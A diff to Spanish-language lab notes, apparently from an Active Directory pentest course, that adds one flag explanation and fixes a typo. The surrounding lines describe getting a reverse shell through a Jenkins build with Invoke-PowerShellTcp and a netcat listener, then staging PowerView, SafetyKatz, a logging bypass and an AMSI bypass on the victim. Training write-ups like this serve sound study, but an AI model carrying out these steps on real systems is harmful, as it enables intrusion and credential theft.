@@ -35,7 +35,7 @@ Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Acces
 ```
 - *-NoPortScan* -> No hacer escaneo de puertos
 - *-RawResults* -> Devuelve los datos completos sin formatear
-
+- *select* -> Filtra por los datos introducidos a continuación
 
 Viendo usuarios como
 ```shell
@@ -70,7 +70,7 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
 Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
 Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now descargándose nuestro *PowerShellTcp* en la maquina victima recibiendo así una conexión en nuestro *Netcat* como el usuario *ciadmin*
 
-Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SfetyKatz y sbloggingbypass* además deberemos de pasarnos el fichero *Amsi-Byp.txt*
+Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SafetyKatz y sbloggingbypass* además deberemos de pasarnos el fichero *Amsi-Byp.txt*
 
 Y nos descargaremos los archivos en el siguiente orden
 ```shell
